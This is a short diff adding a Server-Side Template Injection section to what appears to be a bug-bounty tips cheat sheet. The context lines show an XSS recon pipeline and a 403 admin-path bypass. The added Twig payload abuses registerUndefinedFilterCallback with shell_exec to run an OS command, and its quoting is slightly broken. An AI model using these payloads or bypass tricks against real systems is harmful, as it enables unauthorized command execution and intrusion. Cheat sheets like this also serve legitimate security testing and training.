@@ -111,4 +111,9 @@ cat target.txt | waybackurls | gf xss | kxss
 ## Bypass Admin Location
 1. If GET /admin/ is 403
 2. Try this GET /admin;/
-
+## Server SIde Template Injection
+```sh
+{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('dir)}}
+```
+> ***For more info***
+> ***https://youtu.be/TrQi9iwtA0k***
